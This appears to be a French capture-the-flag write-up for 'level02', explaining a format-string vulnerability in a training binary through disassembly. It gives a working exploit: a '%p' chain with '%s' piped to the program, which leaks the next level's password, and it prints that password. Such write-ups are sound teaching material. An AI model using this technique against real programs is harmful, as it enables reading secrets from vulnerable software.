# level 2 #

En regardant le desassemblage de ```level02```, ```main()``` commence par ouvrir un fichier (chemin code en dur a l'adresse ```0x400bb0```/```0x400bb2```, correspondant a ```/home/users/level03/.pass```) et lit dedans un buffer local (```rbp-0xa0```) avec ```fread```, en verifiant que la taille lue vaut bien ```0x29``` (41 octets) :

```asm
call   0x400700 <fopen@plt>
...
lea    rax,[rbp-0xa0]
call   0x400690 <fread@plt>          ; lit le contenu de /home/users/level03/.pass
mov    DWORD PTR [rbp-0xc],eax
...
cmp    DWORD PTR [rbp-0xc],0x29
je     0x40097d                       ; si taille == 41 -> ok, sinon erreur + exit
```

Le programme demande ensuite deux entrees a l'utilisateur, chacune via ```fgets``` (100 octets max) :

- La premiere est stockee dans ```rbp-0x70```.
- La seconde est stockee dans ```rbp-0x110```.

La seconde entree est comparee au contenu du fichier ```.pass``` (```rbp-0xa0```) avec ```strncmp``` sur ```0x29``` octets :

```asm
lea    rcx,[rbp-0x110]        ; entree utilisateur (2eme saisie)
lea    rax,[rbp-0xa0]         ; contenu du fichier .pass
mov    edx,0x29
call   0x400670 <strncmp@plt>
test   eax,eax
jne    0x400a96                ; si different -> branche "echec"
```

**La faille est dans la branche d'echec.** Si la comparaison echoue, le programme fait :

```asm
lea    rax,[rbp-0x70]          ; rax = 1ere entree utilisateur
mov    rdi,rax
call   0x4006c0 <printf@plt>   ; printf(input_utilisateur) <-- SANS format fixe !
```

Contrairement au cas de succes, ou le format est code en dur (```printf(0x400d22, rbp-0x70)```), ici c'est directement la **premiere entree utilisateur qui sert de chaine de format** a ```printf```. C'est une **format string vulnerability** classique : en y placant des ```%p```/```%s```, on peut lire la pile arbitrairement.

## Exploitation

1. On envoie volontairement un mauvais mot de passe en seconde saisie pour forcer la branche vulnerable (le contenu exact importe peu, il suffit qu'il ne matche pas les 41 octets du fichier ```.pass```).
2. En premiere saisie, on envoie une chaine de format qui empile plusieurs ```%p``` pour deplacer la lecture de la pile, jusqu'a atteindre un pointeur qui pointe vers le buffer contenant le mot de passe lu depuis le fichier (```rbp-0xa0```) ; un ```%s``` final le derefence et l'affiche en clair.

```
".%p" * 7 + "|%s"
```

## Solution

```
(python -c 'print(".%p"*7 + "|%s")'; python -c 'print ("\x70\xe5\xff\xff\xff\x7f")') | ./level02
```

Mot de passe recupere pour ```level03``` :

```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```